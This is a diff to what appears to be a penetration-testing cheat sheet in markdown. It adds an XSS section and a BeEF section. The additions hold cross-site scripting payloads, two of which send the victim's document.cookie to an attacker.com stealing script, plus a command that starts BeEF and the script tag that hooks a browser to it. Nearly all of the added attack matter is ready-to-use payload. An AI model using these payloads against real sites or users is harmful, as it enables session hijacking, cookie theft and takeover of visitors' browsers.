@@ -8,10 +8,26 @@ json
 
 ### old version of API
 
+### postman
+
 ## XSS
 
 The most common special characters used for this purpose include:
-```< > ' " { } ;```
+< > ' " { } ;
+
+```html
+<script>alert(1)</script>
+<iframe src="https://attacker.com/steal_cookie.php?c="+document.cookie></iframe>
+<script>new Image().src="https://attacker.com/steal_cookie.php?c="+document.cookie;</script>
+
+```
+
+### BeEF
+
+```bash
+beef-xss
+<script src="http://127.0.0.1:3000/hook.js"></script>
+```
 
 ### WordPress
 
